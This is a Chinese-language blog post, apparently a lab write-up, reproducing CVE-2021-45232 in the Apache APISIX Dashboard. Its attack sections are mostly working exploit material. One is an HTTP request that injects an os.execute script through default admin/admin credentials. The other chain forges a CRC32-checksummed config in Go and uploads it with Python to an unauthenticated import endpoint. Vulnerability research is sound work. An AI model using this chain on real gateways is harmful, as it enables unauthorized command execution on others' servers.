@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="Apache APISIX介绍Apache APISIX是一个动态、实时、高性能的API网关。提供了丰富的流量管理功能，如负载均衡、动态上游、canary释放、断路、认证、可观察性等。也可以使用Apache APISIX来处理传统的南北向流量，以及服务之间的东西向流量。它也可以用作k8s的ingress控制器。 漏洞概述该漏洞的存在是由于 Manager API 中的错误。Manager API">
+<meta property="og:type" content="article">
+<meta property="og:title" content="A1LB1ue">
+<meta property="og:url" content="http://allblue147.github.io/2022/01/11/1/index.html">
+<meta property="og:site_name" content="A1LB1ue">
+<meta property="og:description" content="Apache APISIX介绍Apache APISIX是一个动态、实时、高性能的API网关。提供了丰富的流量管理功能，如负载均衡、动态上游、canary释放、断路、认证、可观察性等。也可以使用Apache APISIX来处理传统的南北向流量，以及服务之间的东西向流量。它也可以用作k8s的ingress控制器。 漏洞概述该漏洞的存在是由于 Manager API 中的错误。Manager API">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111141421592.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111142145490.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111144106921.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111144804335.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111145019905.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111145423288.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111145544412.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111145707728.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111145828262.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111145908526.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111152207632.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111150211016.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111150706728.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111152002246.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111151427140.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111152557344.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111154814331.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111154421044.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111155455950.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111154908020.png">
+<meta property="og:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111155409256.png">
+<meta property="og:updated_time" content="2022-01-11T07:57:10.866Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="A1LB1ue">
+<meta name="twitter:description" content="Apache APISIX介绍Apache APISIX是一个动态、实时、高性能的API网关。提供了丰富的流量管理功能，如负载均衡、动态上游、canary释放、断路、认证、可观察性等。也可以使用Apache APISIX来处理传统的南北向流量，以及服务之间的东西向流量。它也可以用作k8s的ingress控制器。 漏洞概述该漏洞的存在是由于 Manager API 中的错误。Manager API">
+<meta name="twitter:image" content="http://allblue147.github.io/2022/01/11/1/1.assets/image-20220111141421592.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>A1LB1ue</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+</head>
+
+<script type="text/javascript" src="../source/js/love.js"></script>
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2021/11/28/某泛微 E-Office v9 被捕获的任意文件上传漏洞分析/1/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2022/01/11/1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2022/01/11/1/&text="><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2022/01/11/1/&title="><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2022/01/11/1/&is_video=false&description="><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://allblue147.github.io/2022/01/11/1/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2022/01/11/1/&title="><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2022/01/11/1/&title="><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2022/01/11/1/&title="><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2022/01/11/1/&title="><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2022/01/11/1/&name=&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2022/01/11/1/&t="><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-APISIX介绍"><span class="toc-number">1.</span> <span class="toc-text">Apache APISIX介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞概述"><span class="toc-number">2.</span> <span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#影响版本"><span class="toc-number">3.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-number">4.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现"><span class="toc-number">5.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#后台RCE"><span class="toc-number">5.1.</span> <span class="toc-text">后台RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#未授权接口RCE"><span class="toc-number">5.2.</span> <span class="toc-text">未授权接口RCE</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复方案"><span class="toc-number">6.</span> <span class="toc-text">修复方案</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">JYP</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-01-11T08:25:18.266Z" itemprop="datePublished">2022-01-11</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="Apache-APISIX介绍"><a href="#Apache-APISIX介绍" class="headerlink" title="Apache APISIX介绍"></a>Apache APISIX介绍</h3><p>Apache APISIX是一个动态、实时、高性能的API网关。提供了丰富的流量管理功能，如负载均衡、动态上游、canary释放、断路、认证、可观察性等。也可以使用Apache APISIX来处理传统的南北向流量，以及服务之间的东西向流量。它也可以用作k8s的ingress控制器。</p>
+<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>该漏洞的存在是由于 Manager API 中的错误。Manager API 在 gin 框架的基础上引入了 droplet 框架，所有的 API 和鉴权中间件都是基于 droplet 框架开发的。但是有些 API 直接使用了框架 gin 的接口，从而绕过身份验证。CVE编号为：<code>CVE-2021-45232</code></p>
+<p>未授权访问API:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/apisix/admin/migrate/export</span><br><span class="line">/apisix/admin/migrate/import</span><br></pre></td></tr></table></figure>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache APISIX Dashboard &lt; 2.10.1</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/apisix-docker</span><br><span class="line">cd apisix-docker/example/</span><br></pre></td></tr></table></figure>
+<p>修改docker-compose.yml：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">apache/apisix-dashboard:2.7</span></span><br><span class="line"><span class="attribute">apache/apisix:2.6-alpine</span></span><br></pre></td></tr></table></figure>
+<p>很多文章只是修改了第一处，如果只修改第一处的话，则会因为对应的版本号对不上，而导致登录报错。</p>
+<p><img src="1.assets/image-20220111141421592.png" alt="image-20220111141421592"></p>
+<p><img src="1.assets/image-20220111142145490.png" alt="image-20220111142145490"></p>
+<p>接着通过docker-compose搭建即可</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞环境搭建成功后，通过默认端口9000访问Web界面</p>
+<p><img src="1.assets/image-20220111144106921.png" alt="image-20220111144106921"></p>
+<h4 id="后台RCE"><a href="#后台RCE" class="headerlink" title="后台RCE"></a>后台RCE</h4><p>其实如果没有未授权访问的话，也是可以先通过弱密码登录后台进行RCE的，接下来演示如何进入后台进行RCE。</p>
+<p>首先默认密码admin/admin进入后台</p>
+<p><img src="1.assets/image-20220111144804335.png" alt="image-20220111144804335"></p>
+<p>首先创建一个上游服务</p>
+<p><img src="1.assets/image-20220111145019905.png" alt="image-20220111145019905"></p>
+<p>点击创建，名称可以随意命名，然后目标节点填的是我们转发请求的服务，这里我们填docker附带的Grafana应用，端口号为3000</p>
+<p><img src="1.assets/image-20220111145423288.png" alt="image-20220111145423288"></p>
+<p>点击下一步，提交即可。</p>
+<p>接着再创建一个路由</p>
+<p><img src="1.assets/image-20220111145544412.png" alt="image-20220111145544412"></p>
+<p>名称随便起，然后路径也是可以自定义，点击下一步</p>
+<p><img src="1.assets/image-20220111145707728.png" alt="image-20220111145707728"></p>
+<p>选择我们刚才创建的上游服务</p>
+<p><img src="1.assets/image-20220111145828262.png" alt="image-20220111145828262"></p>
+<p>接下来，默认提交即可。</p>
+<p><img src="1.assets/image-20220111145908526.png" alt="image-20220111145908526"></p>
+<p>创建的路由配置如下:</p>
+<p><img src="1.assets/image-20220111152207632.png" alt="image-20220111152207632"></p>
+<p>创建路由成功后，回到路由配置界面，点击配置按钮，直接点击下一步，到按下提交按钮时使用Burp抓包</p>
+<p><img src="1.assets/image-20220111150211016.png" alt="image-20220111150211016"></p>
+<p>然后添加一个script字段，如下:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/apisix/admin/routes/389826569650045636</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 172.21.1.158:9000</span><br><span class="line"><span class="attribute">Content-Length</span>: 197</span><br><span class="line"><span class="attribute">Accept</span>: application/json</span><br><span class="line"><span class="attribute">Origin</span>: http://172.21.1.158:9000</span><br><span class="line"><span class="attribute">Authorization</span>: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDE4ODcyNzQsImlhdCI6MTY0MTg4MzY3NCwic3ViIjoiYWRtaW4ifQ.m63RB9tu28GHzwT0D_jGbAAmzLQ7FgMIvjr6ze-EtE0</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json;charset=UTF-8</span><br><span class="line"><span class="attribute">Referer</span>: http://172.21.1.158:9000/routes/389826569650045636/edit</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;"uris":["/RCE123"],"methods":["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"],"priority":0,"name":"A1LB1ue_route","status":1,"labels":&#123;&#125;,"script": "os.execute('touch /tmp/Keepb1ue')","upstream_id":"389826160386638532"&#125;</span><br></pre></td></tr></table></figure>
+<p>这里解释一下，这里URL后面routes/后的数字是来自创建的路由ID，而下面的upstream_id是来自创建的上游服务ID，需要自行对应。</p>
+<p><img src="1.assets/image-20220111150706728.png" alt="image-20220111150706728"></p>
+<p>Run之后，在看下配置：</p>
+<p><img src="1.assets/image-20220111152002246.png" alt="image-20220111152002246"></p>
+<p>接着我们访问一下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://172.21.1.158:9080/RCE123</span></span><br></pre></td></tr></table></figure>
+<p>这里需要注意：不是访问当前的9000端口的，而是访问管理的apache/apisix 的9080端口。</p>
+<p>访问后，再到docker中去查看是否创建了Keepb1ue这个文件进行验证</p>
+<p><img src="1.assets/image-20220111151427140.png" alt="image-20220111151427140"></p>
+<h4 id="未授权接口RCE"><a href="#未授权接口RCE" class="headerlink" title="未授权接口RCE"></a>未授权接口RCE</h4><p>那如果没有默认密码或者弱密码的话，这时我们就利用未授权接口进行RCE了</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/apisix/admin/migrate/export</span><br><span class="line">/apisix/admin/migrate/import</span><br></pre></td></tr></table></figure>
+<p>这里我们需要知道这两个接口一个是用来导出配置文件，一个是用来导入配置文件的。</p>
+<p>我们可以使用<code>/apisix/admin/migrate/export</code>直接导出配置文件</p>
+<p>我们可以尝试访问下，当然我们利用的是未授权接口，自然是不用登录</p>
+<p><img src="1.assets/image-20220111152557344.png" alt="image-20220111152557344"></p>
+<p>访问可以看到配置文件信息，这里仔细看，后面多出四个字节，这4个字节其实是配置文件的checksum值</p>
+<p>在导入配置文件时，会对配置文件的checksum值进行校验，那这里其实是可以通过写脚本算出checksum校验值，或者是根据apisix的源码去计算出新的checksum值</p>
+<p>源码位置在：apisix-dashboard-master\api\internal\handler\migrate\migrate.go的<code>ExportConfig</code>函数</p>
+<p>将其计算源码单独抽取出来</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"encoding/binary"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"hash/crc32"</span></span><br><span class="line">    <span class="string">"io/ioutil"</span></span><br><span class="line">    <span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    gen()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">gen</span><span class="params">()</span></span> &#123;</span><br><span class="line">    data := []<span class="keyword">byte</span>(<span class="string">`&#123;"Counsumers":[],"Routes":[&#123;"id":"389828862525047492","create_time":1641885708,"update_time":1641885708,"uris":["/RCE123"],"name":"Keepb1ue_route","methods":["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"],"script":"os.execute('touch /tmp/A1LB1ue')","script_id":"389792240563651268","upstream_id":"389828818199642820","status":1&#125;],"Services":[],"SSLs":[],"Upstreams":[&#123;"id":"389828818199642820","create_time":1641885682,"update_time":1641885682,"nodes":[&#123;"host":"172.21.1.158","port":3000,"weight":1&#125;],"timeout":&#123;"connect":6,"read":6,"send":6&#125;,"type":"roundrobin","scheme":"http","pass_host":"pass","name":"upstream"&#125;],"Scripts":[&#123;"id":"389792240563651268","script":"os.execute('touch /tmp/A1LB1ue')"&#125;],"GlobalPlugins":[],"PluginConfigs":[]&#125;`</span>)</span><br><span class="line">    checksumUint32 := crc32.ChecksumIEEE(data)</span><br><span class="line">    checksumLength := <span class="number">4</span></span><br><span class="line">    checksum := <span class="built_in">make</span>([]<span class="keyword">byte</span>, checksumLength)</span><br><span class="line">    binary.BigEndian.PutUint32(checksum, checksumUint32)</span><br><span class="line">    fileBytes := <span class="built_in">append</span>(data, checksum...)</span><br><span class="line"></span><br><span class="line">    content := fileBytes</span><br><span class="line">    fmt.Println(content)</span><br><span class="line"></span><br><span class="line">    importData := content[:<span class="built_in">len</span>(content)<span class="number">-4</span>]</span><br><span class="line">    checksum2 := binary.BigEndian.Uint32(content[<span class="built_in">len</span>(content)<span class="number">-4</span>:])</span><br><span class="line">    <span class="keyword">if</span> checksum2 != crc32.ChecksumIEEE(importData) &#123;</span><br><span class="line">        fmt.Println(checksum2)</span><br><span class="line">        fmt.Println(crc32.ChecksumIEEE(importData))</span><br><span class="line">        fmt.Println(<span class="string">"Check sum check fail, maybe file broken"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    err := ioutil.WriteFile(<span class="string">"apisixPayload"</span>, content, os.ModePerm)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"error!!"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将需要导入的配置进行替换，并插入RCE语句</p>
+<p>接着运行这段脚本，会生成apisixPayload这个文件</p>
+<p><img src="1.assets/image-20220111154814331.png" alt="image-20220111154814331"></p>
+<p>这个就是我们要import上去的计算好校验值的新的配置文件，接下来使用python代码可以简单的传到服务端</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://172.21.1.158:9000/apisix/admin/migrate/import"</span></span><br><span class="line">files = &#123;<span class="string">"file"</span>: open(<span class="string">"apisixPayload"</span>, <span class="string">"rb"</span>)&#125;</span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">"mode"</span>: <span class="string">"overwrite"</span>&#125;, files=files)</span><br><span class="line">print(r.status_code)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure>
+<p><img src="1.assets/image-20220111154421044.png" alt="image-20220111154421044"></p>
+<p>很好，没有报校验值错误。</p>
+<p>接下来访问路由地址即可命令执行成功。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://172.21.1.158:9080/RCE123</span></span><br></pre></td></tr></table></figure>
+<p><img src="1.assets/image-20220111155455950.png" alt="image-20220111155455950"></p>
+<p><img src="1.assets/image-20220111154908020.png" alt="image-20220111154908020"></p>
+<p>在这里推荐下github大佬写的是带回显的可以执行多次命令的接口配置项目</p>
+<p><a href="https://github.com/wuppp/cve-2021-45232-exp#readme" target="_blank" rel="noopener">https://github.com/wuppp/cve-2021-45232-exp#readme</a></p>
+<p><a href="https://github.com/allblue147/cve-2021-45232-exp" target="_blank" rel="noopener">https://github.com/allblue147/cve-2021-45232-exp</a></p>
+<p><img src="1.assets/image-20220111155409256.png" alt="image-20220111155409256"></p>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>更新到最新版本，新版本代理做了鉴权处理</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-APISIX介绍"><span class="toc-number">1.</span> <span class="toc-text">Apache APISIX介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞概述"><span class="toc-number">2.</span> <span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#影响版本"><span class="toc-number">3.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-number">4.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现"><span class="toc-number">5.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#后台RCE"><span class="toc-number">5.1.</span> <span class="toc-text">后台RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#未授权接口RCE"><span class="toc-number">5.2.</span> <span class="toc-text">未授权接口RCE</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复方案"><span class="toc-number">6.</span> <span class="toc-text">修复方案</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2022/01/11/1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2022/01/11/1/&text="><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2022/01/11/1/&title="><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2022/01/11/1/&is_video=false&description="><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://allblue147.github.io/2022/01/11/1/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2022/01/11/1/&title="><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2022/01/11/1/&title="><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2022/01/11/1/&title="><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2022/01/11/1/&title="><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2022/01/11/1/&name=&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2022/01/11/1/&t="><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    JYP
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
